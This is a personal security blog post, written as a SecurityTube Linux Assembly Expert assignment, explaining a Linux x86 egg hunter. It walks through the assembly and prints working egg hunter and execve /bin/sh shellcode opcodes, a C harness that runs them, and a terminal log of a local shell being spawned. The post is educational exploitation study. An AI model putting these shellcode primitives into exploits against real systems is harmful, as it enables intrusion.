<!DOCTYPE html>
<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--><!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8"><![endif]--><!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9"><![endif]--><!--[if gt IE 8]><!--><html class="no-js">
<!--<![endif]--> <head> <meta charset="UTF-8"> <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"> <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> <title>SLAE Assignment 3 - Egg Hunter – popped.io</title> <meta name="description" content="A collection of my security research, random projects and attempts to amuse."> <meta name="keywords" content="SLAE, SecurityTube, Assignment, Shellcode, nasm, assembly, egg hunter, access syscall"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="http://localhost:4000/assets/img/me.png"> <meta name="twitter:title" content="SLAE Assignment 3 - Egg Hunter"> <meta name="twitter:description" content="SLAE Assignment StubThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <meta name="twitter:site" content="@hackerjiv"> <meta name="twitter:creator" content="@hackerjiv"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="SLAE Assignment 3 - Egg Hunter"> <meta property="og:description" content="SLAE Assignment StubThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <meta property="og:url" content="http://localhost:4000/SLAE-Assignment-3/"> <meta property="og:site_name" content="popped.io"> <meta property="og:image" content="http://localhost:4000/assets/img/me.png"> <link rel="canonical" href="http://localhost:4000/SLAE-Assignment-3/"> <link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="popped.io Feed"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- CSS --> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css"> <!-- JS --> <script src="http://localhost:4000/assets/js/modernizr-3.3.1.custom.min.js"></script> <!-- Favicons --> <link rel="apple-touch-icon" href="http://localhost:4000/assets/img/favicons/apple-icon-precomposed.png"> <link rel="apple-touch-icon" sizes="72x72" href="http://localhost:4000/assets/img/favicons/apple-icon-72x72.png"> <link rel="apple-touch-icon" sizes="114x114" href="http://localhost:4000/assets/img/favicons/apple-icon-114x114.png"> <link rel="apple-touch-icon" sizes="144x144" href="http://localhost:4000/assets/img/favicons/apple-icon-144x144.png"> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png"> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico"> <!-- Background Image --> <style type="text/css">body {background-image:url(http://localhost:4000/assets/img/placeholder-big.jpg); background-repeat: no-repeat; background-size: cover; }</style> <!-- Post Feature Image --> <!-- Begin Jekyll SEO tag v2.2.3 --> <title>SLAE Assignment 3 - Egg Hunter | popped.io</title> <meta property="og:title" content="SLAE Assignment 3 - Egg Hunter"> <meta name="author" content="Sanjiv Kawa"> <meta property="og:locale" content="en_US"> <meta name="description" content="SLAE Assignment Stub This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <meta property="og:description" content="SLAE Assignment Stub This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <link rel="canonical" href="http://localhost:4000/SLAE-Assignment-3/"> <meta property="og:url" content="http://localhost:4000/SLAE-Assignment-3/"> <meta property="og:site_name" content="popped.io"> <meta property="og:type" content="article"> <meta property="article:published_time" content="2016-12-04T18:10:00-05:00"> <meta name="twitter:card" content="summary"> <meta name="twitter:site" content="@"> <meta name="twitter:creator" content="@Sanjiv Kawa"> <script type="application/ld+json"> {"@context":"http://schema.org","@type":"BlogPosting","headline":"SLAE Assignment 3 - Egg Hunter","author":{"@type":"Person","name":"Sanjiv Kawa"},"datePublished":"2016-12-04T18:10:00-05:00","dateModified":"2016-12-04T18:10:00-05:00","description":"SLAE Assignment Stub This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/me.png"},"name":"Sanjiv Kawa"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/SLAE-Assignment-3/"},"url":"http://localhost:4000/SLAE-Assignment-3/"}</script> <!-- End Jekyll SEO tag --> </head> <body> <nav id="dl-menu" class="dl-menuwrapper" role="navigation"> <button class="dl-trigger">Open Menu</button> <ul class="dl-menu"> <li><a href="http://localhost:4000/">Home</a></li> <li> <a href="#">About</a> <ul class="dl-submenu"> <li> <img src="http://localhost:4000/assets/img/me.png" alt="popped.io photo" class="author-photo"> <h4>popped.io</h4> <p>A collection of my security research, random projects and attempts to amuse.</p> </li> <li><a href="http://localhost:4000/about/"><span class="btn btn-inverse">Learn More</span></a></li> <li> <a href="mailto:sanjiv@popped.io" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-envelope-square"></i> Email</a> </li> <li> <a href="http://twitter.com/hackerjiv" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a> </li> <li> <a href="http://linkedin.com/in/sanjivkawa" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-linkedin-square"></i> LinkedIn</a> </li> <li> <a href="http://github.com/skahwah" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-github"></i> Github</a> </li> </ul>
<!-- /.dl-submenu --> </li> <li> <a href="#">Posts</a> <ul class="dl-submenu"> <li><a href="http://localhost:4000/posts/">All Posts</a></li> <li><a href="http://localhost:4000/tags/">All Tags</a></li> </ul> </li> <li><a href="http://localhost:4000/projects/">Projects</a></li> </ul>
<!-- /.dl-menu --> </nav><!-- /.dl-menuwrapper --> <!-- Header --> <header class="header" role="banner"> <div class="wrapper animated fadeIn"> <div class="content"> <div class="post-title "> <h1>SLAE Assignment 3 - Egg Hunter</h1> <h4>04 Dec 2016</h4> <p class="reading-time"> <i class="fa fa-clock-o"></i> Reading time ~23 minutes </p>
<!-- /.entry-reading-time --> <a class="btn zoombtn" href="http://localhost:4000/posts/"> <i class="fa fa-chevron-left"></i> </a> </div> <h3 id="slae-assignment-stub">SLAE Assignment Stub</h3> <p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.</p> <p><a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p> <p>Student ID: SLAE-807</p> <h3 id="assignment-3-requirements">Assignment 3 Requirements</h3> <ul> <li>Study the egg hunter shellcode. It is similar to a two stage shellcode.</li> <li>The first stage searches for a pattern it can find in memory. That pattern signifies where the second stage lies which needs to be executed.</li> <li>Create a working demo of an egg hunter. It should be configurable for different payloads. This means that once the pattern has been found the second stage should be easily configurable.</li> </ul> <h3 id="what-are-egg-hunters">What are Egg Hunters?</h3> <p>First off, I want to thank Skape for putting together a paper titled <a href="www.hick.org/code/skape/papers/egghunt-shellcode.pdf">Safely Searching Process Virtual Address Space</a>. This really helped me understand how to write Linux x86 egg hunters that are robust, reliable and can safely traverse the virtual memory address space of an arbitrary process.</p> <p>Egg hunters are incredibly useful from an exploitation perspective. There are scenarios where a small amount of space is accessible in a deterministic location of an arbitrary process. This space is usually too small for shellcode, but can house an egg hunter.</p> <p>Shellcode is then placed somewhere else in the same arbitrary process, however the specific location is unknown.</p> <p>The purpose of an egg hunter, in terms of exploitation, can be broken in to two stages:</p> <ul> <li> <p>Stage 1 consists of traversing the virtual memory address space for a process and inspecting all memory locations for a specific, yet arbitrarily constructed four byte value. This value is referred to as an egg, for example: <code class="highlighter-rouge">\x41\x42\x41\x42</code>. There are some cases where an egg needs to avoid certain bad characters or contain valid instructions, this is based on the design of the egg hunter, and sometimes restrictions imposed by the process.</p> </li> <li> <p>Stage 2 consists of passing execution to the memory location in the same arbitrary process that contains the shellcode. The same egg is placed at the beginning of shellcode, typically twice, and signifies the start of a series of malicious instructions. For example: <code class="highlighter-rouge">\x41\x42\x41\x42\x41\x42\x41\x42[execute shell on remote system]</code>.</p> </li> </ul> <p>The reason why the egg is placed twice at the beginning of the shellcode is because it enables the egg hunter to search for a value in memory that has the same four byte values which are one after the other.</p> <h3 id="the-shellcode">The Shellcode</h3> <p>The example shellcode I will be using is a really simple stack-based <code class="highlighter-rouge">execve</code> SYSCALL that executes <code class="highlighter-rouge">/bin/sh</code>.</p> <p>The nasm source is located <a href="https://github.com/skahwah/slae/blob/master/execve-stack/execve-stack.nasm">here</a> and a brief breakdown of the shellcode is located <a href="https://popped.io/execve-stack/">here</a><a>.</a></p> <p>Here are the opcodes:</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>50<span class="se">\x</span>89<span class="se">\x</span>e2<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80
</code></pre></div> <h3 id="the-egghunter">The Egghunter</h3> <p>The egg hunter is responsible for searching for the shellcode in the virtual memory address space of an arbitrary process.</p> <p>The egg hunter uses the <code class="highlighter-rouge">access</code> system call to identify valid memory addresses by means of the <code class="highlighter-rouge">EFAULT</code> error code. If this error code is returned by the <code class="highlighter-rouge">access</code> system call, the page value is simply incremented to the next page until a valid memory address is found.</p> <p>Once a valid memory address is found, the <code class="highlighter-rouge">scas</code> instruction is used to compare the <code class="highlighter-rouge">DWORD</code> value in the current memory location against the egg. If the contents of the current memory location do not contain the egg, then the address is incremented and the search continues until the egg is found. At this point, execution of the process is directed to the memory address directly after the located eggs, which signifies the start of the <code class="highlighter-rouge">execve</code> <code class="highlighter-rouge">/bin/sh</code> shellcode.</p> <p>The egg hunter can be found <a href="https://github.com/skahwah/slae/blob/master/assignment3/egghunter.nasm">here</a>.</p> <p>I have also created a “test” program written in C. This uses the egg hunter to traverse the virtual memory address space for the “test” process searching for a user supplied egg. The egg does not need to consist of executable instructions.</p> <p>This egg is prepended to the stack-based <code class="highlighter-rouge">execve</code> <code class="highlighter-rouge">/bin/sh</code> shellcode. Once the egg is found, execution is passed to the shellcode.</p> <p>The test program can be found <a href="https://github.com/skahwah/slae/blob/master/assignment3/egghunter-test.c">here</a>.</p> <p>Compile it using these options: <code class="highlighter-rouge">gcc -fno-stack-protector -z execstack egghunter-test.c -o egghunter-test</code></p> <h3 id="dissecting-the-egg-hunter">Dissecting the Egg Hunter</h3> <p>1. Clearing the direction flag and registers</p> <p>The first few instructions are responsible for clearing the <code class="highlighter-rouge">EAX</code> and <code class="highlighter-rouge">EBX</code> registers. The direction flag is also cleared to prevent the egg hunter from failing as the <code class="highlighter-rouge">scas</code> instruction is used. It may be possible that this flag is set by the process, although unlikely.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">cld</span>		
<span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span><span class="err">`</span>
<span class="k">xor</span> <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span>
</code></pre></div> <p><br>2. <code class="highlighter-rouge">next_page:</code></p> <p>The <code class="highlighter-rouge">next_page:</code> procedure is responsible for aligning the page value of the current memory address. It largely serves as an incrementor to the next page size if an invalid memory location is returned by the <code class="highlighter-rouge">access</code> system call.</p> <p>The first address of relevance is typically <code class="highlighter-rouge">0x8048000</code>, however this egg hunter does not assume that the virtual memory address space for the given process follows conventional memory address spaces. As such, the first address that is examined is <code class="highlighter-rouge">0x0001000</code>.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="n">next_page</span><span class="o">:</span>
  <span class="k">or</span> <span class="n">dx</span><span class="p">,</span> <span class="mh">0xfff</span> <span class="c">;page alignment</span>
</code></pre></div> <p><br>2. <code class="highlighter-rouge">increment_address:</code></p> <p>The <code class="highlighter-rouge">increment_address:</code> procedure is largely responsible for incrementing the current address that is in <code class="highlighter-rouge">EDX</code> by <code class="highlighter-rouge">1</code>. Later, the value in the <code class="highlighter-rouge">EDX</code> is placed into <code class="highlighter-rouge">EDI</code> when inspected by <code class="highlighter-rouge">scas</code>&gt; The purpose of this is to increment the current address in the event that the user supplied egg as not been found.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">inc</span> <span class="n">edx</span>		
</code></pre></div> <p><br>3. The <code class="highlighter-rouge">access</code> system call</p> <p>The <code class="highlighter-rouge">access</code> system call, <code class="highlighter-rouge">0x21</code> or <code class="highlighter-rouge">33</code>, simply takes the value currently in the <code class="highlighter-rouge">EBX</code> register, which represents a memory location, and attempts to access it. The return value of the <code class="highlighter-rouge">access</code> syscall is stored in <code class="highlighter-rouge">AL</code> and indicates if the supplied memory location is valid. The <code class="highlighter-rouge">access</code> system call only requires the one argument.</p> <p>The <code class="highlighter-rouge">EBX</code> register contains the value in the <code class="highlighter-rouge">EDX</code> register plus four. This is so that eight contiguous bytes of memory can be searched.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">lea</span> <span class="n">ebx</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span> <span class="o">+</span><span class="mh">0x4</span><span class="err">]</span>
<span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x21</span>		
<span class="k">int</span> <span class="mh">0x80</span>
</code></pre></div> <p><br>4. <code class="highlighter-rouge">search_vas:</code></p> <p>The <code class="highlighter-rouge">search_vas:</code> procedure is largely responsible for comparing the <code class="highlighter-rouge">DWORD</code> value in the current memory location against the egg and directing execution of the process to shellcode once the egg has been located. However, this can be elaborated on and other interesting elements in this procedure can also be touched on.</p> <p>First, a comparison is conducted against the value currently in the <code class="highlighter-rouge">AL</code> register and <code class="highlighter-rouge">0xf2</code>.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0xf2</span>
</code></pre></div> <p>The return value of the <code class="highlighter-rouge">access</code> system call is stored in <code class="highlighter-rouge">AL</code> and indicates if the supplied memory location is valid. If the memory location is not valid, <code class="highlighter-rouge">0xf2</code>, which represents the low byte of the <code class="highlighter-rouge">EFAULT</code> return value is stored in the <code class="highlighter-rouge">AL</code> register.</p> <p>If <code class="highlighter-rouge">0xf2</code> exists in <code class="highlighter-rouge">AL</code> the current memory location is invalid. The zero flag is set, as comparing <code class="highlighter-rouge">0xf2</code> by itself is <code class="highlighter-rouge">0</code>. This triggers the next instruction to execute.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code> <span class="k">je</span> <span class="n">next_page</span>
</code></pre></div> <p>This jumps to the <code class="highlighter-rouge">next_page</code> procedure. As mentioned in Step. 2, the <code class="highlighter-rouge">next_page</code> procedure increments to the next page value.</p> <p>If <code class="highlighter-rouge">AL</code> does not contain <code class="highlighter-rouge">0xf2</code>, then a valid memory address has been accessed by the <code class="highlighter-rouge">access</code> system call and the previous instruction in skipped as the zero flag will not be set.</p> <p>The following instruction simply moves the egg in to the <code class="highlighter-rouge">EAX</code> register.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x534B534B</span> <span class="c">;SKSK</span>
</code></pre></div> <p>The reason for this is that the <code class="highlighter-rouge">EAX</code> register is one of the native IA-32 instructions for doing string based comparisons with <code class="highlighter-rouge">scas</code>. In other words, the value in the memory location currently inspected by <code class="highlighter-rouge">scas</code> is compared against the value in <code class="highlighter-rouge">EAX</code>.</p> <p>The next instruction takes the value in <code class="highlighter-rouge">EDX</code>, which is a memory address, and places it into <code class="highlighter-rouge">EDI</code> as <code class="highlighter-rouge">EDI</code> is used by <code class="highlighter-rouge">scas</code> when inspecting the contents of a memory location.</p> <p>In addition, the current memory address in <code class="highlighter-rouge">EDX</code>, and now <code class="highlighter-rouge">EDI</code> is currently four bytes behind the value in <code class="highlighter-rouge">EBX</code>, which was the memory address accessed by the <code class="highlighter-rouge">access</code> system call.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edx</span>
</code></pre></div> <p>The next instruction takes the <code class="highlighter-rouge">DWORD</code> stored in <code class="highlighter-rouge">EAX</code>, which is the egg, <code class="highlighter-rouge">0x534B534B</code>, and compares it against the value in the memory location referred to be the <code class="highlighter-rouge">EDI</code> register.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">scasd</span>
</code></pre></div> <p>If the value in the memory location pointed to the <code class="highlighter-rouge">EDI</code> register does not match the value in the <code class="highlighter-rouge">EAX</code> register, essentially meaning that the egg has not been found, then the zero flag will not be set. This triggers the next instruction to execute.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">jne</span> <span class="n">increment_address</span>
</code></pre></div> <p>This jumps to the <code class="highlighter-rouge">increment_address</code> procedure. As mentioned in Step. 1, the <code class="highlighter-rouge">increment_address</code> procedure increments the value in <code class="highlighter-rouge">EDX</code>, which is later stored in <code class="highlighter-rouge">EDI</code> to the next memory address to be searched by <code class="highlighter-rouge">scasd</code>.</p> <p>Otherwise, if the zero flag is set, this indicates that the egg has been located in the memory location currently pointed to by <code class="highlighter-rouge">EDI</code>. As comparing the egg in <code class="highlighter-rouge">EAX</code> with the value in <code class="highlighter-rouge">EDI</code>, which is also the egg results in a <code class="highlighter-rouge">0</code>.</p> <p><code class="highlighter-rouge">scasd</code> then increments the value in <code class="highlighter-rouge">EDI</code> by four bytes. This effectively shifts the comparison done by <code class="highlighter-rouge">scasd</code> to the next memory address after the egg. This is the memory location for the duplicated egg before the beginning of the shellcode.</p> <p><code class="highlighter-rouge">scasd</code> will once again set the zero flag which indicates that the egg has been located in the memory location currently pointed to by <code class="highlighter-rouge">EDI</code>. As comparing the egg in <code class="highlighter-rouge">EAX</code> with the value in <code class="highlighter-rouge">EDI</code>, which is the second egg results in a <code class="highlighter-rouge">0</code>.</p> <p><code class="highlighter-rouge">scasd</code> then increments the value in <code class="highlighter-rouge">EDI</code> by four bytes. The address in <code class="highlighter-rouge">EDI</code> now contains the memory location pointing to the beginning of the shellcode after the eight egg bytes.</p> <p>The zero flag is set, once again, thus bypassing the next instruction which is <code class="highlighter-rouge">jne increment_address</code> and executing the following instruction <code class="highlighter-rouge">jmp edi</code>.</p> <p><code class="highlighter-rouge">EDI</code> currently contains the memory address to where the second stage exists, this is the address contains the beginning of the shellcode after the eight egg bytes.</p> <p>As such, once <code class="highlighter-rouge">jmp edi</code> is executed, the process performs an unconditional jump to the memory address where the second stage exists and passes control to the shellcode.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0xf2</span>			
<span class="k">je</span> <span class="n">next_page</span>			
<span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x534B534B</span>
<span class="k">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edx</span>
<span class="k">scasd</span>
<span class="k">jne</span> <span class="n">increment_address</span>		
<span class="k">scasd</span>				
<span class="k">jne</span> <span class="n">increment_address</span>		
<span class="k">jmp</span> <span class="n">edi</span>
</code></pre></div> <h3 id="the-test-program">The Test Program</h3> <p>As mentioned above, I have created a “test” program written in C. This uses the egg hunter to traverse the virtual memory address space for the “test” process for a user supplied egg.</p> <div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="cm">/*
Egg Hunter for Linux x86
Sanjiv Kawa (@skawasec)
www.popped.io
December 4, 2016
*/</span>

<span class="cp">#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
</span>
<span class="cp">#define EGG "\x4b\x53\x4b\x53" //SKSK
</span>
<span class="kt">char</span> <span class="n">egg</span><span class="p">[]</span> <span class="o">=</span> <span class="n">EGG</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">egg_hunter</span><span class="p">[]</span> <span class="o">=</span> \
                              <span class="s">"</span><span class="se">\xfc</span><span class="s">"</span>	   	           	<span class="c1">// cld
</span>                              <span class="s">"</span><span class="se">\x31\xc0</span><span class="s">"</span>	           	<span class="c1">// xor eax,eax
</span>                              <span class="s">"</span><span class="se">\x31\xd2</span><span class="s">"</span>          		<span class="c1">// xor ebx,ebx
</span>                              <span class="s">"</span><span class="se">\x66\x81\xca\xff\x0f</span><span class="s">"</span>	<span class="c1">// or dx,0xfff
</span>                              <span class="s">"</span><span class="se">\x42</span><span class="s">"</span>		            	<span class="c1">// inc edx
</span>                              <span class="s">"</span><span class="se">\x8d\x5a\x04</span><span class="s">"</span>       		<span class="c1">// lea ebx,[edx+0x4]
</span>                              <span class="s">"</span><span class="se">\xb8\x21\x00\x00\x00</span><span class="s">"</span>	<span class="c1">// mov eax,0x21
</span>                              <span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>		          <span class="c1">// int 0x80
</span>                              <span class="s">"</span><span class="se">\x3c\xf2</span><span class="s">"</span>		          <span class="c1">// cmp al,0xf2
</span>                              <span class="s">"</span><span class="se">\x74\xec</span><span class="s">"</span>		          <span class="c1">// je next_page
</span>                              <span class="s">"</span><span class="se">\xb8</span><span class="s">"</span> <span class="n">EGG</span>		          <span class="c1">// mov EGG
</span>                              <span class="s">"</span><span class="se">\x89\xd7</span><span class="s">"</span>		          <span class="c1">// mov edi,edx
</span>                              <span class="s">"</span><span class="se">\xaf</span><span class="s">"</span>			            <span class="c1">// scasd
</span>                              <span class="s">"</span><span class="se">\x75\xe7</span><span class="s">"</span>		          <span class="c1">// jne increment_address
</span>                              <span class="s">"</span><span class="se">\xaf</span><span class="s">"</span>			            <span class="c1">// scasd
</span>                              <span class="s">"</span><span class="se">\x75\xe4</span><span class="s">"</span>		          <span class="c1">// jne increment_address
</span>                              <span class="s">"</span><span class="se">\xff\xe7</span><span class="s">"</span><span class="p">;</span>		          <span class="c1">// jmp edi
</span>

<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">second_stage</span><span class="p">[]</span> <span class="o">=</span> \
                                <span class="n">EGG</span>
                                <span class="n">EGG</span>
                                <span class="s">"</span><span class="se">\x31\xc0\x50\x68\x6e\x2f\x73\x68</span><span class="s">"</span>
                                <span class="s">"</span><span class="se">\x68\x2f\x2f\x62\x69\x89\xe3\x50</span><span class="s">"</span>
                                <span class="s">"</span><span class="se">\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">"</span><span class="p">;</span> <span class="c1">// /bin/sh execve-stack
</span>
<span class="n">main</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Searching for: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">EGG</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Egg Hunter Length: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">egg_hunter</span><span class="p">));</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Shellcode Length: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">second_stage</span><span class="p">));</span>
  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">egg_hunter</span><span class="p">;</span>
  <span class="n">ret</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div> <p>The test program can be found <a href="https://github.com/skahwah/slae/blob/master/assignment3/egghunter-test.c">here</a>.</p> <p>Execution of the egg hunter can be examined in <code class="highlighter-rouge">gdb</code> after linking, assembling and extracting the opcodes from the egg hunter and placing them into the test program is done.</p> <p>Before this examining the egg hunter in <code class="highlighter-rouge">gdb</code>, it is a good idea to test if the program executes as expected.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment3$ </span>ls
compile.sh  egghunter.nasm  shellcode.c
<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment3$ </span>./compile.sh egghunter
<span class="o">[</span>+] Assembling with Nasm
<span class="o">[</span>+] Linking
<span class="o">[</span>+] Extracting Opcodes
<span class="s2">"</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">ca</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">b8</span><span class="se">\x</span><span class="s2">21</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">3c</span><span class="se">\x</span><span class="s2">f2</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">b8</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">d7</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">e7"</span>
<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment3$ </span>vim shellcode.c
<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment3$ </span>cat shellcode.c | grep <span class="s2">"hunter</span><span class="se">\[\]</span><span class="s2">"</span> -A 18
unsigned char egg_hunter[] <span class="o">=</span> <span class="se">\</span>
                              <span class="s2">"</span><span class="se">\x</span><span class="s2">fc"</span>	   	           	// cld
                              <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0"</span>	           	// xor eax,eax
                              <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">d2"</span>          		// xor ebx,ebx
                              <span class="s2">"</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">ca</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">0f"</span>	// or dx,0xfff
                              <span class="s2">"</span><span class="se">\x</span><span class="s2">42"</span>		            	// inc edx
                              <span class="s2">"</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">04"</span>       		// lea ebx,[edx+0x4]
                              <span class="s2">"</span><span class="se">\x</span><span class="s2">b8</span><span class="se">\x</span><span class="s2">21</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00"</span>	// mov eax,0x21
                              <span class="s2">"</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>		          // int 0x80
                              <span class="s2">"</span><span class="se">\x</span><span class="s2">3c</span><span class="se">\x</span><span class="s2">f2"</span>		          // cmp al,0xf2
                              <span class="s2">"</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">ec"</span>		          // je next_page
                              <span class="s2">"</span><span class="se">\x</span><span class="s2">b8"</span> EGG		          // mov EGG
                              <span class="s2">"</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">d7"</span>		          // mov edi,edx
                              <span class="s2">"</span><span class="se">\x</span><span class="s2">af"</span>			            // scasd
                              <span class="s2">"</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">e7"</span>		          // jne increment_address
                              <span class="s2">"</span><span class="se">\x</span><span class="s2">af"</span>			            // scasd
                              <span class="s2">"</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">e4"</span>		          // jne increment_address
                              <span class="s2">"</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">e7"</span>;		          // jmp edi

<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment3$ </span>gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment3$ </span>./shellcode
<span class="o">[</span>+] Searching <span class="k">for</span>: KSKS
<span class="o">[</span>+] Egg Hunter Length: 16
<span class="o">[</span>+] Shellcode Length: 33
<span class="gp">$ </span><span class="nb">exit
</span>skawa@ubuntu:~/Desktop/code/assignment/assignment3<span class="err">$</span>
